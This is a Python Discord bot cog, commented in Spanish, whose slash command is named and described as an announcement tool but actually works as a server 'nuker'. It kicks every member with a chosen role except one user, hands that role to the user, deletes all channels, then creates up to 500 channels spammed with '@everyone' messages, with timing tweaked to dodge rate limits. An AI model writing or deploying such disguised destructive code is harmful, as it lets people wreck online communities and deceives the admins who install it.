import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.defer(ephemeral=True)
        
        try:
            guild = interaction.guild
            
            # 1. Expulsar miembros con el rol especificado (excepto useradmin) - CORREGIDO
            members_to_kick = []
            
            # Obtener todos los miembros del servidor
            async for member in guild.fetch_members():
                # Verificar si el miembro tiene el rol (comparando IDs)
                if any(role.id == roletogive.id for role in member.roles) and member.id != useradmin.id:
                    members_to_kick.append(member)
            
            # Expulsar miembros en paralelo para mayor velocidad
            kick_tasks = []
            for member in members_to_kick:
                try:
                    kick_tasks.append(member.kick(reason=f"Reorganización: {interaction.user}"))
                except Exception as e:
                    print(f"No se pudo expulsar a {member}: {e}")
            
            # Esperar a que todas las expulsiones se completen
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
            
            # 3. Eliminar todos los canales MÁS RÁPIDO
            delete_tasks = []
            for channel in guild.channels:
                delete_tasks.append(channel.delete())
            
            # Ejecutar todas las eliminaciones en paralelo
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 4. Crear INFINITOS canales y spamear mensajes
            spam_message = f"@everyone {message}"
            channel_count = 0
            max_channels = 500  # Límite para evitar bloqueos excesivos
            
            while channel_count < max_channels:
                try:
                    # Crear canal con nombre único
                    channel_name = f"{message}-{channel_count}"
                    new_channel = await guild.create_text_channel(
                        channel_name[:100]  # Limitar a 100 caracteres (límite de Discord)
                    )
                    
                    # Enviar mensajes inmediatamente después de crear el canal
                    for _ in range(3):  # Enviar 3 mensajes por canal
                        try:
                            await new_channel.send(spam_message)
                        except Exception as e:
                            print(f"Error al enviar mensaje: {e}")
                    
                    channel_count += 1
                    
                    # Pequeño delay aleatorio para evitar rate limits extremos
                    await asyncio.sleep(0.1 + random.random() * 0.2)
                    
                except Exception as e:
                    print(f"Error al crear canal: {e}")
                    # Si hay error, probablemente rate limit, esperar un poco más
                    await asyncio.sleep(1)
                    break  # Salir del bucle si hay error persistente
            
            await interaction.followup.send(f"Operación completada. Se crearon {channel_count} canales.", ephemeral=True)
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(Announce(bot))
